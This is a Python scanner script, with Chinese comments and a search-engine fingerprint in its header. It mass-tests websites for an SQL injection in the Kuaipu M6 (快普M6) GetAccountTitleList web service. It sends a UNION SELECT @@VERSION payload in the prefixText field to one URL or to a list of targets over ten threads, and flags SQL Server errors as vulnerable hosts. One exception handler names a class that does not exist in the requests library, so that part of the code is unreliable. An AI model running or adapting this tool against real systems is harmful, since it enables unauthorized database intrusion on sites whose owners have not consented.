# 快普M6 GetAccountTitleList 存在SQL注入
# body="Resource/JavaScript/jKPM6.DateTime.js"
from multiprocessing.dummy import Pool
import requests,warnings
import urllib3
import argparse
urllib3.disable_warnings()
warnings.filterwarnings("ignore")
def main():
    banner = """
              _____                    _____                   _______                   _____                    _____                   _______
         /\    \                  /\    \                 /::\    \                 /\    \                  /\    \                 /::\    \
        /::\____\                /::\    \               /::::\    \               /::\____\                /::\    \               /::::\    \
       /:::/    /               /::::\    \             /::::::\    \             /:::/    /               /::::\    \             /::::::\    \
      /:::/    /               /::::::\    \           /::::::::\    \           /:::/    /               /::::::\    \           /::::::::\    \
     /:::/    /               /:::/\:::\    \         /:::/~~\:::\    \         /:::/    /               /:::/\:::\    \         /:::/~~\:::\    \
    /:::/____/               /:::/__\:::\    \       /:::/    \:::\    \       /:::/____/               /:::/__\:::\    \       /:::/    \:::\    \
   /::::\    \              /::::\   \:::\    \     /:::/    / \:::\    \     /::::\    \              /::::\   \:::\    \     /:::/    / \:::\    \
  /::::::\    \   _____    /::::::\   \:::\    \   /:::/____/   \:::\____\   /::::::\    \   _____    /::::::\   \:::\    \   /:::/____/   \:::\____\
 /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    | /:::/\:::\    \ /\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |
/:::/  \:::\    /::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |/:::/  \:::\    /::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |
\::/    \:::\  /:::/    /\::/    \:::\  /:::/    / \:::\    \   /:::/    / \::/    \:::\  /:::/    /\::/    \:::\  /:::/    / \:::\    \   /:::/    /
 \/____/ \:::\/:::/    /  \/____/ \:::\/:::/    /   \:::\    \ /:::/    /   \/____/ \:::\/:::/    /  \/____/ \:::\/:::/    /   \:::\    \ /:::/    /
          \::::::/    /            \::::::/    /     \:::\    /:::/    /             \::::::/    /            \::::::/    /     \:::\    /:::/    /
           \::::/    /              \::::/    /       \:::\__/:::/    /               \::::/    /              \::::/    /       \:::\__/:::/    /
           /:::/    /               /:::/    /         \::::::::/    /                /:::/    /               /:::/    /         \::::::::/    /
          /:::/    /               /:::/    /           \::::::/    /                /:::/    /               /:::/    /           \::::::/    /
         /:::/    /               /:::/    /             \::::/    /                /:::/    /               /:::/    /             \::::/    /
        /:::/    /               /:::/    /               \::/____/                /:::/    /               /:::/    /               \::/____/
        \::/    /                \::/    /                 ~~                      \::/    /                \::/    /                 ~~
         \/____/                  \/____/                                           \/____/                  \/____/
        """
    print(banner)

    parse = argparse.ArgumentParser(description="快普M6 GetAccountTitleList 存在SQL注入")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='输入文件')
    args = parse.parse_args()
    urls=[]
    if args.url:
        check(updata(args.url))
    elif args.file:
        with open(args.file,"r+") as f:
            for i in f:
                domain=i.strip()
                urls.append(updata(domain))
        pool=Pool(10)
        pool.map(check,urls)
    else:
        print("输入参数")

def updata(url):
    if "http" in url:
        return url
    else:
        return f"http://{url}"

def check(domain):
    url=f"{domain}/WebService/wsAutoComplete.asmx/GetAccountTitleList"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data="prefixText=a'+UNION+ALL+SELECT+@@VERSION,NULL,NULL--&count=1"
    try:
        response = requests.post(url=url, headers=headers,data=data,timeout=5, verify=False)
        if (response.status_code == 500) and ("SQL Server" in response.text):
            print(f"[+]存在漏洞{domain}")
        else:
            print(f"[-]不存在漏洞")
    except requests.exceptions.ConnectTimeout:
            # 处理连接超时（服务器无法在超时时间内响应）
        print(f"[!] 连接超时 → {domain}（请检查端口是否开放或网络是否通畅）")
    except requests.exceptions.ConnectionRefusedError:
        # 处理连接被拒绝（服务器主动拒绝，端口未开放）
        print(f"[!] 连接被拒 → {domain}（目标端口未开放或防火墙拦截）")
    except requests.exceptions.Timeout:
        # 处理读取超时（连接成功但无响应内容）
        print(f"[!] 读取超时 → {domain}（服务器处理过慢）")
    except requests.exceptions.RequestException as e:
        # 捕获所有其他requests相关异常（通用网络错误）
        print(f"[!] 网络错误 → {domain}（{str(e)[:60]}...）")
    except Exception as e:
        # 捕获其他未知异常（避免脚本崩溃）
        print(f"[!] 未知错误 → {domain}（{str(e)[:60]}...）")


if __name__ == '__main__':
    main()